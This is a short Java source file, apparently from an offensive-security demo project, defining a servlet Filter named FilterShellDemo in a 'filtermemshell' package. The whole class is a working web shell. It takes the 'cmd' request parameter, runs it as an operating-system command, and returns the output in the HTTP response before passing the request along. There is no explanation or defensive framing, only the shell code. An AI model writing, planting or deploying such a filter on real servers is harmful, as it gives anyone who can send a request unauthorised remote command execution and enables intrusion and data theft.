package cc.saferoad.servlet.filtermemshell;/*
@auther S0cke3t
@date 2021-12-27
*/

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;

/**
 * @author 15105
 */
public class FilterShellDemo implements Filter {
    public FilterShellDemo() {
    }
    @Override
    public void init(FilterConfig filterConfig) {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String command = servletRequest.getParameter("cmd");
        if (command != null && !command.isEmpty()) {
            PrintWriter out = servletResponse.getWriter();
            Process process = Runtime.getRuntime().exec(command);
            InputStream in = process.getInputStream();
            int a = 0;
            byte[] b = new byte[1024];
            while ((a = in.read(b)) != -1) {
                out.println(new String(b, 0, a));
            }
            in.close();
            out.flush();
            out.close();
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
